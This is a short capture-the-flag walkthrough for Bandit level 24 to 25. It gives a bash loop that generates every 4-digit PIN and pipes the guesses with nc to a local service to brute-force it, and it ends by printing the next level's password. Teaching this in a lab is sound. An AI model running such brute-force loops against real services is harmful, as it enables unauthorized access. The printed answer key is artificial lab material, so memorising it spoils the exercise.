level 24 to 25

Goal:
A service is running on port 30002
It will give the bandit25 password
Only if you send:
The bandit24 password
A correct 4-digit PIN
You don’t know the PIN, so you must try all 0000–9999 (brute force)

idea:
Instead of typing 10,000 PINs manually:
Create a text file with all combinations
Send them automatically to the service
The correct one will return the password

step by step:
1.Create a working directory
mkdir /tmp/bandit24
cd /tmp/bandit24
2.Create the script
nano script.sh
3.Paste this:

#!/bin/bash

for i in {0..9}{0..9}{0..9}{0..9}
do
  echo "BANDIT24_PASSWORD $i"
done
4.Make the script executable
chmod +x script.sh
5.Run the script and send output to the service
./script.sh | nc localhost 30002
6.What happens now?

The script sends 10,000 attempts

The service checks each one

When the PIN is correct, it responds with:

Correct!
The password of bandit25 is: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
